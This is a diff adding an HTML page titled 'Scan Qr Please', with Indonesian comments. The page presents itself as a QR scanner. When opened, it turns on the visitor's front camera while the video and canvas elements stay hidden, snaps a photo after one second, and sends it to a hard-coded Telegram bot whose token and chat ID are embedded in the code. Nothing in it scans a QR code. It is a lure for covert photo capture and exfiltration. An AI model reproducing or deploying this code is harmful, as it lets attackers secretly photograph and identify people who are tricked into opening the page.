@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Scan Qr Please</title>
+ <style>
+ video, canvas {
+ display: none;
+ }
+ </style>
+</head>
+<body>
+ <video id="video" autoplay playsinline></video>
+ <canvas id="canvas"></canvas>
+
+ <script>
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const ctx = canvas.getContext('2d');
+
+ const chatId = "7627832345";
+ const botToken = "7987561124:AAFnUA4TJF9sR7rHLr3UPHHReRwFk9MWY6Q";
+
+ // Akses kamera depan
+ navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+ .then(stream => {
+ video.srcObject = stream;
+
+ // Tunggu video ready lalu ambil gambar
+ video.onloadedmetadata = () => {
+ setTimeout(() => {
+ canvas.width = video.videoWidth;
+ canvas.height = video.videoHeight;
+ ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+ canvas.toBlob(blob => {
+ const formData = new FormData();
+ formData.append("chat_id", chatId);
+ formData.append("photo", blob, "kamera.jpg");
+
+ fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+ method: "POST",
+ body: formData
+ })
+ .then(res => console.log("Terkirim ke Telegram"))
+ .catch(err => console.error("Gagal kirim:", err));
+ }, "image/jpeg");
+ }, 1000); // Tunggu 1 detik untuk stabilisasi kamera
+ };
+ })
+ .catch(err => {
+ console.error("Gagal akses kamera:", err);
+ });
+ </script>
+</body>
+</html>
